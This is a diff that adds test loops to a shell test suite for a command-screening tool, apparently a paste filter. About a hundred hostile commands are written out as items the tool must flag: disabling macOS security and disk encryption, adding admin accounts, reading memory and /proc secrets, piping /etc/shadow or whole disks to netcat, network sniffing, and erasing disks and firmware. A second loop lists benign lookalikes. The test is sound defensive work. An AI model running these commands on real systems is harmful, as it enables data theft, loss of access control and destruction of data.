@@ -11671,6 +11671,107 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-240: macOS defense-off/exec/account + memory/core scrape +
+#   namespace/dbus exec + stream-upload exfil + serve-host/MITM +
+#   macOS/tape/firmware wipe (P9 +60)
+for c in \
+    'spctl --global-disable' 'csrutil clear' 'fdesetup disable' \
+    'fdesetup remove' 'fdesetup authrestart' 'profiles -I -F x' \
+    'profiles remove -all' 'launchctl bootout system x' \
+    'launchctl disable gui/x' 'dscl . create /Users/x' \
+    'dscl . passwd /Users/x' 'dscl . -create /Users/x' \
+    'dscl . append /Groups/admin x y' 'dscl . delete /Users/x' \
+    'dscl . -delete /Users/x' 'sysadminctl -addUser x' \
+    'sysadminctl -resetPasswordFor x' 'sysadminctl -secureTokenOn x' \
+    'sysadminctl -autologin set' 'pwpolicy setaccountpolicies' \
+    'pwpolicy setuserhashtype x' 'pwpolicy -u x -setpassword y' \
+    'defaults write com.apple.loginwindow LoginHook x' \
+    'defaults write com.apple.x LogoutHook y' \
+    'hdiutil attach http://x' 'do shell script "x"' \
+    'security authorizationdb write x' 'security set-keychain-settings x' \
+    'kickstart -activate' 'kickstart -configure -access' \
+    'kickstart -install -package x' 'screencapture x.png' \
+    'screencapture -x x' 'pbpaste' 'sntp -s x' 'sntp -sS x' \
+    'scutil --nc start x' 'cupsctl --remote-admin' \
+    'shortcuts run x' 'automator -i x w' 'lldb -p 1' 'gcore 1' \
+    'coredumpctl dump x' 'coredumpctl gdb x' 'eu-stack -p 1' \
+    'procstat -a x' 'cat /dev/mem' 'head /dev/kmem' 'xxd /dev/port' \
+    'cat /proc/1/mem' 'cat /proc/self/environ' 'cat /proc/1/maps' \
+    'cat /proc/kcore' 'unshare -rm sh' 'unshare --map-root-user' \
+    'unshare -m sh' 'unshare --fork' 'unshare -r sh' \
+    'machinectl shell' 'machinectl exec x' 'busctl call x' \
+    'dbus-send --system x' 'loginctl enable-linger' \
+    'nc h 9 < /etc/shadow' 'ncat h 9 < x' 'netcat h 9 < x' \
+    'tar cf - /etc | nc h 9' 'tar czf - /x |ssh h cat' \
+    'tar czf - /x | socat - h:9' 'dd | ssh h dd' \
+    'dd if=/dev/sda | nc h 9' 'cat x | nc h 9' 'nsupdate -k x' \
+    'nsupdate -y x' 'openssl s_server -accept 4' \
+    'cryptcat -l -p 9 -e x' 'php -S 0.0.0.0:8' \
+    'python -m http.server' 'python3 -m http.server' \
+    'ruby -run -e httpd' 'darkhttpd /' 'miniserve' 'webfsd' \
+    'thttpd' 'smbserver' 'updog' 'twistd' 'python -m smtpd -n -c x' \
+    'ifconfig en0 promisc' 'ip link set eth0 promisc on' \
+    'ip neigh add x' 'ip neigh replace x' \
+    'diskutil eraseDisk JHFS+ x /dev/d0' \
+    'diskutil apfs deleteContainer /dev/d1' 'diskutil zeroDisk /dev/d0' \
+    'diskutil secureErase 4 /dev/d0' 'diskutil eraseVolume x y /dev/d0' \
+    'diskutil partitionDisk /dev/d0 x y' 'diskutil apfs deleteVolume x' \
+    'sg_erase /dev/sg0' 'hdparm --write-sector x /dev/sda' \
+    'hdparm --fwdownload x /dev/sda' 'hdparm --trim-sector-ranges x /dev/sda' \
+    'mt -f /dev/st0 erase'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "1" "1" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in \
+    'cat /proc/1/cmdline' 'cat /proc/version' 'cat /proc/net/tcp' \
+    'ls /proc/1' 'cat /proc/1/status' 'cat /proc/1/stat' \
+    'cat /proc/1/mounts' 'cat /proc/meminfo' 'cat /proc/1/smaps' \
+    'cat /proc/cpuinfo' 'cat /proc/swaps' 'head /proc/1/io' \
+    'cat /proc/diskstats' 'cat /proc/filesystems' 'cat /proc/1/fd' \
+    'ls /dev/mem' 'file /dev/mem' 'stat /dev/mem' 'mount /dev/mem' \
+    'cat /dev/null' 'cat /dev/zero' 'cat /dev/urandom' \
+    'unshare -n sh' 'unshare --ipc sh' 'unshare --version' \
+    'unshare --help' 'unshare x' 'systemd-nspawn -D x' \
+    'systemd-nspawn --version' 'busctl list' 'busctl status' \
+    'busctl tree' 'busctl monitor' 'busctl --version' \
+    'dbus-send --session x' 'dbus-send --print-reply x' \
+    'dbus-send --version' 'loginctl list-sessions' 'loginctl show-user' \
+    'machinectl list' 'machinectl status' 'machinectl --version' \
+    'tar czf - /x | cat > y' 'ssh h cat /etc/hosts' 'nc h 9' \
+    'nc -z h 9' 'nc -v h 9' 'cat x < y' 'dd if=x of=y' \
+    'tar czf x.tgz /x' 'tar xzf x.tgz' 'nsupdate' 'nsupdate -l' \
+    'dig +short x TXT' 'openssl x509 -in x' 'php -v' 'php x.php' \
+    'python -m venv x' 'python -m pip install x' \
+    'python -m http.client' 'ruby -v' 'arp -a' 'arp -n' \
+    'arp -d 1.2.3.4' 'ifconfig' 'ifconfig en0' 'ip link show' \
+    'ip neigh show' 'netstat -r' 'security find-certificate' \
+    'security list-keychains' 'spctl --status' 'spctl --enable' \
+    'csrutil status' 'fdesetup status' 'fdesetup list' \
+    'profiles status' 'profiles list' 'launchctl list' \
+    'launchctl print x' 'dscl . read /Users/x' 'dscl . list /Users' \
+    'dscl . -read /Users/x' 'sysadminctl' \
+    'pwpolicy getaccountpolicies' 'pwpolicy' \
+    'defaults read com.apple.x' 'defaults write com.apple.x y' \
+    'hdiutil attach x.dmg' 'hdiutil create x' 'hdiutil detach x' \
+    'osascript' 'osascript -e "tell app x to beep"' 'automator' \
+    'automator -h' 'shortcuts list' 'shortcuts view x' 'sntp -k x' \
+    'sntp' 'scutil --proxy' 'scutil --dns' 'scutil' 'cupsctl' \
+    'cupsctl --no-remote-any' 'networksetup -listallnetworkservices' \
+    'networksetup -getinfo x' 'xcodebuild -version' 'codesign -v x' \
+    'kickstart' 'the kickstart script' 'pmset -g' 'socat x' 'socat -' \
+    'diskutil list' 'diskutil info /dev/d0' 'diskutil unmount x' \
+    'diskutil eject x' 'diskutil mount x' 'diskutil verifyVolume x' \
+    'diskutil mountDisk x' 'diskutil cs list' 'mt -f /dev/st0 status' \
+    'mt -f /dev/st0 rewind' 'mt status' 'sg_inq /dev/sg0' \
+    'hdparm -I /dev/sda' 'hdparm -i /dev/sda' 'sg_raw /dev/sg0 x' \
+    'lldb' 'lldb -b x' 'the lldb debugger' 'lldb docs' \
+    'eu-readelf' 'eu-nm' 'coredumpctl list' 'coredumpctl info'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-239: GUI/input injection + screen/mic capture +
 #   web-terminal/VNC backdoors + eBPF + exfil upload + AD-recon/C2/
 #   RAT/phishing names + SUID install + sqlite cred-db + LOLBin names
